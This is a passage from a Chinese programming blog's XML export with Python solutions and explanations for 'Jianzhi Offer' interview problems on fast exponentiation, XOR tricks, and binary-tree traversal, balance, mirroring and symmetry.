<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Power</span><span class="params">(self, base, exponent)</span>:</span></div><div class="line">        <span class="keyword">return</span> base ** exponent</div></pre></td></tr></table></figure>
<p>　　当指数为负数的时候：可以先对指数求绝对值，然后算出次方的结果之后再取倒数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Power</span><span class="params">(self, base, exponent)</span>:</span></div><div class="line">        n = abs(exponent)</div><div class="line"></div><div class="line">        result = <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">            result = result*base</div><div class="line"></div><div class="line">        <span class="keyword">if</span> exponent &lt; <span class="number">0</span>:</div><div class="line">            result = <span class="number">1.0</span>/result</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　快速幂，使用位运算：</p>
<ul>
<li>&amp;运算：通常用于二进制取位操作，例如一个数x &amp; 1 的结果就是取二进制的最末位的值。还可以判断这个数的奇偶性，如果x&amp;1==0，则x为偶数；如果x&amp;1==1，则x为奇数。</li>
<li>>&gt;运算：在这里是作为除法来使用，例如一个数x，x &gt;&gt; 1就表示x右移一位，即x=x/2。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">例如，求2^11：</div><div class="line">11的二进制表示1011，因此，10可以转化为：1*2^0 + 1*2^1 + 0*2^2 + 1*2^3</div><div class="line">2^11可以转化为：</div><div class="line">2^(1*2^0 + 1*2^1 + 0*2^2 + 1*2^3)</div><div class="line">得到：</div><div class="line">2^(2^0) * 2^(2^1) * 2^(2^3)</div></pre></td></tr></table></figure>
<p>　　代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Power</span><span class="params">(self, base, exponent)</span>:</span></div><div class="line">        n = abs(exponent)</div><div class="line">        ans = <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> n:</div><div class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</div><div class="line">                ans = ans * base</div><div class="line">            base = base * base</div><div class="line">            n = n &gt;&gt; <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> exponent &lt; <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">1.0</span> / ans</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> ans</div></pre></td></tr></table></figure>
<p>　　分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1011：</div><div class="line">ans=2, base=2^2, 右移1位：0101</div><div class="line">0101:</div><div class="line">ans=2*2^2, base=2^4, 右移1位：0010</div><div class="line">0010:</div><div class="line">base=2^8, 右移1位：0001</div><div class="line">0001:</div><div class="line">ans=2*2^2*2^8, base=2^16, 右移1位：0000</div><div class="line">最终：</div><div class="line">ans=2*2^2*2^8</div></pre></td></tr></table></figure>
<h4 id="数组中只出现一次的数字"><a href="#数组中只出现一次的数字" class="headerlink" title="数组中只出现一次的数字"></a>数组中只出现一次的数字</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　一个整型数组里除了两个数字之外，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。</p>
<h5 id="题解-1-2"><a href="#题解-1-2" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　遍历数组，用哈希表来进行计数，最后从哈希表中找出计数为 1 的数即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回[a,b] 其中ab是出现一次的两个数字</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindNumsAppearOnce</span><span class="params">(self, array)</span>:</span></div><div class="line">        dic = &#123;&#125;</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> array:</div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> dic:</div><div class="line">                dic[i] += <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                dic[i] = <span class="number">1</span></div><div class="line">        result = []</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> dic.items():</div><div class="line">            <span class="keyword">if</span> v == <span class="number">1</span>:</div><div class="line">                result.append(k)</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="题解-2-2"><a href="#题解-2-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　利用异或的特性：异或运算中，任何一个数字和自己本身异或都是 0，任何一个数字和 0 异或都是本身。这个特性能够找出只有一个数出现一次的情况。而现在的问题是，除了有两个数字只出现了一次，其他数字都出现了两次。</p>
<p>　　因此，如果尝试把原数组分成两个子数组，且刚好每个子数组中各自包含一个只出现一次的数字。则在该前提下，每个子数组中，只有一个数字出现了一次，其他数字都出现了两次。针对每个子数组，从头到尾依次异或每个数字，则最后留下来的就是只出现了一次的数字。因为出现两次的都抵消掉了。</p>
<p>　　那么，怎样实现子数组的划分呢？若对原数组从头到尾的进行异或，则最后得到的结果就是两个只出现一次的数字的异或运算结果。这个结果的二进制表示中，至少有一位为1，因为这两个数不相同。该位记为从最低位开始计数的第 n 位。那么，分组的标准定为从最低位开始计数的第 n 位是否为 1。因为出现两次的同一个数字，各个位数上都是相同的，所以一定被分到同一个子数组中，且每个子数组中只包含一个出现一次的数字。</p>
<p>　　举个例子：数组元素为 [2, 4, 3, 6, 3, 2, 5, 5]，异或的结果为 0010，也就是倒数第二位为 1，也就是倒数第二位为标记位来进行拆分，那么第一个子数组就为 [2, 3, 6, 3, 2]，他们的倒数第二位为 1，第二个子数组为 [4, 5, 5] 倒数第二位为 0，对这两个子数组分别再异或，最终找到 6 和 4。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回[a,b] 其中ab是出现一次的两个数字</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindNumsAppearOnce</span><span class="params">(self, array)</span>:</span></div><div class="line">        tmp = array[<span class="number">0</span>]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(array)):</div><div class="line">            tmp ^= array[i]</div><div class="line"></div><div class="line">        index = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> tmp &amp; <span class="number">1</span> == <span class="number">0</span>:</div><div class="line">            tmp &gt;&gt;= <span class="number">1</span></div><div class="line">            index += <span class="number">1</span></div><div class="line"></div><div class="line">        a = <span class="number">0</span></div><div class="line">        b = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> array:</div><div class="line">            <span class="keyword">if</span> (j &gt;&gt; index) &amp; <span class="number">1</span> == <span class="number">1</span>:</div><div class="line">                a ^= j</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                b ^= j</div><div class="line">        <span class="keyword">return</span> a, b</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-二叉树(二)</title>
    <url>/2019/08/02/%E5%89%91%E6%8C%87offer-%E4%BA%8C%E5%8F%89%E6%A0%91-%E4%BA%8C/</url>
    <content><![CDATA[<center>秋招，来了！</center>

<a id="more"></a>
<h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一棵二叉树，判断该二叉树是否是平衡二叉树。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　只需确保树的左右子树的高度差不超过 2 即可。一个树的深度为左子树和右子树深度的最大值 + 1。问题规模转变为求左子树和右子树的深度，问题形式不变，规模变小，典型的递归问题，最后向上回溯即可求得输入的根节点的高度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">IsBalanced_Solution</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        left_depth = self.TreeDepth(pRoot.left)</div><div class="line">        right_depth = self.TreeDepth(pRoot.right)</div><div class="line">        <span class="keyword">if</span> abs(left_depth - right_depth) &gt; <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">TreeDepth</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        left = self.TreeDepth(pRoot.left)</div><div class="line">        right = self.TreeDepth(pRoot.right)</div><div class="line">        <span class="keyword">return</span> max(left, right) + <span class="number">1</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　改进题解 1，在求节点的深度只需遍历一次节点。利用一个全局变量表示平衡标志位，在求树的深度时，对求得的左右子树的高度进行判断是否符合平衡二叉树的要求，若不满足，平衡标志位为 False。同时，在求树的深度的时判断这个标志位，若为 False，则说明该树的某一部分不平衡，直接返回即可，即树不是平衡的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.isBalance = <span class="keyword">True</span></div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">IsBalanced_Solution</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        self.juge(pRoot)</div><div class="line">        <span class="keyword">return</span> self.isBalance</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">juge</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> self.isBalance == <span class="keyword">False</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        left = self.juge(root.left)</div><div class="line">        right = self.juge(root.right)</div><div class="line">        <span class="keyword">if</span> abs(left - right) &lt; <span class="number">2</span>:</div><div class="line">            self.isBalance = <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            self.isBalance = <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> max(left, right) + <span class="number">1</span></div></pre></td></tr></table></figure>
<h4 id="二叉树的镜像"><a href="#二叉树的镜像" class="headerlink" title="二叉树的镜像"></a>二叉树的镜像</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　操作给定的二叉树，将其变换为源二叉树的镜像。输入描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">二叉树的镜像定义：源二叉树 </div><div class="line">    	    8</div><div class="line">    	   /  \</div><div class="line">    	  6   10</div><div class="line">    	 / \  / \</div><div class="line">    	5  7 9 11</div><div class="line">    	镜像二叉树</div><div class="line">    	    8</div><div class="line">    	   /  \</div><div class="line">    	  10   6</div><div class="line">    	 / \  / \</div><div class="line">    	11 9 7  5</div></pre></td></tr></table></figure>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　递归实现。交换当前节点的左右子树，然后继续操作交换后的左右子节点的孩子节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回镜像树的根节点</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Mirror</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span></div><div class="line">        root.left, root.right = root.right, root.left</div><div class="line">        self.Mirror(root.left)</div><div class="line">        self.Mirror(root.right)</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　非递归实现。层次遍历，将每个节点的左右子节点互换即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回镜像树的根节点</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Mirror</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        queue = [root]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            level = []</div><div class="line">            length = len(queue)</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">                node = queue[i]</div><div class="line">                node.left, node.right = node.right, node.left</div><div class="line">                <span class="keyword">if</span> node.left:</div><div class="line">                    level.append(node.left)</div><div class="line">                <span class="keyword">if</span> node.right:</div><div class="line">                    level.append(node.right)</div><div class="line">            queue = level</div></pre></td></tr></table></figure>
<h4 id="对称的二叉树"><a href="#对称的二叉树" class="headerlink" title="对称的二叉树"></a>对称的二叉树</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　请实现一个函数，用来判断一颗二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。</p>
<h5 id="题解-1-2"><a href="#题解-1-2" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　递归方法，判断的规则：</p>
<ul>
<li><p>如果左子树或右子树均为空，则该树对称；</p>
</li>
<li><p>如果左子树或右子树只有一个为空，则该树不对称；</p>
</li>
<li><p>如果左子树和右子树均不为空，当左子树的左子树和右子树的右子树镜像对称，且左子树的右子树和右子树的左子树镜像对称时，该树对称。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSymmetrical</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.isMirror(pRoot, pRoot)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isMirror</span><span class="params">(self, p1, p2)</span>:</span></div><div class="line">        <span class="keyword">if</span> p1 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">and</span> p2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">if</span> p1 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> p2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> p1.val != p2.val:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> self.isMirror(p1.left, p2.right) <span class="keyword">and</span> self.isMirror(p1.right, p2.left)</div></pre></td></tr></table></figure>
<h5 id="题解-2-2"><a href="#题解-2-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　非递归方法，判断规则一样。每次成对取出节点，这两个节点其实是二叉树的对称位置，判断这两个节点的相等情况：</p>
<ul>
<li>如果两节点均为空，则继续下一轮循环；</li>
<li>如果两节点只有一个为空，直接返回 False；</li>
<li>如果两节点都不为空，且它们的数值不同，也直接返回 False；</li>
<li>此时两节点的数值一定相等，将它们的左右子节点逆序加入到队列中，保证每一对节点都是对称的位置。</li>
</ul>
<p>　　到最后，如果队列中为空，则二叉树对称，返回 True。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSymmetrical</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        queue = [pRoot.left, pRoot.right]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            node1 = queue.pop()</div><div class="line">            node2 = queue.pop()</div><div class="line">            <span class="keyword">if</span> node1 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">and</span> node2 <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> node1 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> node2 <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> node1.val != node2.val:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            queue.append(node1.left)</div><div class="line">            queue.append(node2.right)</div><div class="line">            queue.append(node1.right)</div><div class="line">            queue.append(node2.left)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-二叉树(一)</title>
    <url>/2019/08/01/%E5%89%91%E6%8C%87offer-%E4%BA%8C%E5%8F%89%E6%A0%91-%E4%B8%80/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="二叉树的深度"><a href="#二叉树的深度" class="headerlink" title="二叉树的深度"></a>二叉树的深度</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　递归解法。深度优先遍历，比较每条路径的长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">TreeDepth</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        left = self.TreeDepth(pRoot.left)</div><div class="line">        right = self.TreeDepth(pRoot.right)</div><div class="line">        <span class="keyword">return</span> max(left, right)+<span class="number">1</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　非递归实现。使用队列辅助实现层次遍历，然后对每一层计数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">TreeDepth</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        depth = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> depth</div><div class="line">        queue = [pRoot]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            depth += <span class="number">1</span></div><div class="line">            tmp_queue = []</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> queue:</div><div class="line">                <span class="keyword">if</span> i.left:</div><div class="line">                    tmp_queue.append(i.left)</div><div class="line">                <span class="keyword">if</span> i.right:</div><div class="line">                    tmp_queue.append(i.right)</div><div class="line">            queue = tmp_queue</div><div class="line">        <span class="keyword">return</span> depth</div></pre></td></tr></table></figure>
<h4 id="从上往下打印二叉树"><a href="#从上往下打印二叉树" class="headerlink" title="从上往下打印二叉树"></a>从上往下打印二叉树</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　从上往下打印出二叉树的每个节点，同层节点从左至右打印。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　考察二叉树的广度遍历。可以借助一个队列来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回从上到下每个节点值列表，例：[1,2,3]</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PrintFromTopToBottom</span><span class="params">(self, root)</span>:</span></div><div class="line">        result = []</div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> result</div><div class="line">        queue = [root]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            tmp = queue.pop(<span class="number">0</span>)</div><div class="line">            result.append(tmp.val)</div><div class="line">            <span class="keyword">if</span> tmp.left:</div><div class="line">                queue.append(tmp.left)</div><div class="line">            <span class="keyword">if</span> tmp.right:</div><div class="line">                queue.append(tmp.right)</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h4 id="把二叉树打印成多行"><a href="#把二叉树打印成多行" class="headerlink" title="把二叉树打印成多行"></a>把二叉树打印成多行</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　从上到下按层打印二叉树，同一层结点从左至右输出。每一层输出一行。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　借助队列，实现层次遍历，把每一层的所有结点的值加入到结果列表中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回二维列表[[1,2],[4,5]]</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        result = []</div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> result</div><div class="line">        queue = [pRoot]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            tmp_queue = []</div><div class="line">            level = []</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> queue:</div><div class="line">                level.append(i.val)</div><div class="line">                <span class="keyword">if</span> i.left:</div><div class="line">                    tmp_queue.append(i.left)</div><div class="line">                <span class="keyword">if</span> i.right:</div><div class="line">                    tmp_queue.append(i.right)</div><div class="line">            queue = tmp_queue</div><div class="line">            result.append(level)</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-搜索算法</title>
    <url>/2019/07/25/%E5%89%91%E6%8C%87offer-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<center>秋招，来了！</center>

<a id="more"></a>
<h4 id="二维数组中的查找"><a href="#二维数组中的查找" class="headerlink" title="二维数组中的查找"></a>二维数组中的查找</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　遍历二维数组，查找是否有与目标值相等的数。但是，这样的方法没有利用题目给出的特性：每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># array 二维列表</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(self, target, array)</span>:</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)):</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(array[<span class="number">0</span>])):</div><div class="line">                <span class="keyword">if</span> target == array[i][j]:</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　从二维数组右上角的元素开始比较，如果目标值大于该值，则查找下一行，否则，就在这一行查找，依次左移，进行比较。这样可以更快地定位到目标元素可能出现的行/列。</p>
